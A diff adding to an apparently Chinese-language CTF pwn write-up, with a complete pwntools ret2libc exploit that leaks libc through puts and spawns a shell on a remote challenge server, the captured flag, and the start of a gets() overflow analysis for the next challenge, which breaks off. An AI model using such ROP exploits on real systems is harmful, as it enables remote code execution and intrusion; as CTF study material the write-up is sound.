@@ -469,3 +469,136 @@ ret_addr = 0x4006b9
 
 
 
+
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = "node5.buuoj.cn"
+port = 28831
+
+p = remote(ip,port)
+elf = ELF('./pwn')
+
+rdix_addr = 0x400c83
+retx_addr = 0x4006b9 
+encrypt_addr = 0x04009A0
+
+offset = b'\0' + b'a'* (0x50 + 0x08-1)
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+# encrypt_addr = elf.symbols['encrypt']
+
+payload = offset
+payload += p64(rdix_addr) + p64(puts_got)
+payload += p64(puts_plt) 
+payload += p64(encrypt_addr)
+
+p.recvuntil(b'Input your choice!\n')
+p.sendline(str(1))
+
+p.recvuntil(b'Input your Plaintext to be encrypted\n')
+p.sendline(payload)
+p.recvline()
+p.recvline()
+
+puts_addr = u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))
+
+libc = LibcSearcher("puts",puts_addr)
+
+libc_base = puts_addr - libc.dump('puts')
+
+system_addr = libc_base + libc.dump('system')
+
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+
+payload_exp = offset
+
+payload_exp += p64(retx_addr) + p64(rdix_addr)
+
+payload_exp += p64(binsh_addr) + p64(system_addr)
+
+p.recvuntil(b'Input your Plaintext to be encrypted')
+p.sendline(payload_exp)
+
+p.interactive()
+```
+
+
+
+拿到flag：
+
+```
+flag{3f6ddea2-b817-4c30-87a5-932479cd6e00}
+```
+
+
+
+## get_started_3dsctf_2016
+
+
+
+check一下 32位，partial relro，nx开启
+
+ida打开好像似曾相识
+
+main函数：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [esp+4h] [ebp-38h] BYREF
+
+  printf("Qual a palavrinha magica? ", v4[0]);
+  gets(v4);
+  return 0;
+}
+```
+
+
+
+flag函数在这里：
+
+```c
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // esi
+  unsigned __int8 v3; // al
+  int v4; // ecx
+  unsigned __int8 v5; // al
+
+  if ( a1 == 814536271 && a2 == 425138641 )
+  {
+    v2 = fopen("flag.txt", "rt");
+    v3 = getc(v2);
+    if ( v3 != 255 )
+    {
+      v4 = (char)v3;
+      do
+      {
+        putchar(v4);
+        v5 = getc(v2);
+        v4 = (char)v5;
+      }
+      while ( v5 != 255 );
+    }
+    fclose(v2);
+  }
+}
+```
+
+
+
+要传入形参，找pop2ret1的，但这里是32位，所以直接找rax
+
+
+
+测出偏移量为：
+
+![image-20241108144759255](../_media/image-20241108144759255.png)
+
+
+
